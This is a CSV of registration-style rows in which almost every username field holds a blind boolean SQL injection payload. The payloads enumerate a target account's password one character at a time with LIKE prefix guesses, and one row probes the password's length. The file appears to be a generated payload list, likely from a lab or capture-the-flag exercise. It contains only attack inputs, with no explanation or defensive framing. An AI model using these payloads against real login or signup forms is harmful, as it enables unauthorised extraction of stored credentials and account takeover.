email,username,password
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_d%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_m%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_n%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_o%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_p%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_q%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_r%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_s%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_t%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_u%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_v%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_w%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_x%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_y%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e_anD_iD_z%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_e9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ea%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ec%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ed%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ee%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ef%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ei%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ej%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ek%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_el%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_em%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_en%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eo%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ep%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_er%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_es%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_et%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_eu%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ev%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ew%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ex%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ey%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'mikE_pEN_ez%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'n%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'o%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'p%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'q%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'r%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 's%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 't%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'u%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'v%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'w%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'x%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'y%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pEN_e_anD_iD__1' and password like 'z%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mik9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mika%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mike%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'miki%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikj%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikk%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikl%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikn%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'miko%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikp%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikq%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikr%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'miks%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikt%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'miku%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikv%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikw%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikx%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'miky%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce anD iD =1' and password like 'mikz%')#,123123
12312,admin' and exists(select * from users where username='mike_pence' and length(password)=4)#,1
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123_%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1230%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1231%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1232%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1233%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1234%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1235%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1236%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1237%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1238%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '1239%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123d%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123m%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123n%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123o%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123p%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123q%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123r%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123s%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123t%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123u%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123v%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123w%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123x%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123y%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like '123z%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'a%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'b%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'c%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'e%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'f%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'g%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'h%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'i%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'j%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'k%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'l%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm %')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm;%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm:%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm*%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm#%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'm%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm+%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm=%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'm9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'ma%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'md%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'me%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mf%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mikE_pENce' and password like 'mi%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik/_%'ESCAPE '/')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mik9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mika%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikc%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pENce' and password like 'mikd%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e_%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e-%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e0%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e1%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e2%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e3%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e4%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e5%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e6%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e7%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e8%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_e9%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ea%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eb%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ec%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ed%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ee%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ef%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eg%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_eh%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ei%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ej%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_ek%')#,123123
mike_pence@asu.edu,admin' and exists(select * from users where username='mike_pence' and password like 'mikE_pEN_el%')#,123123
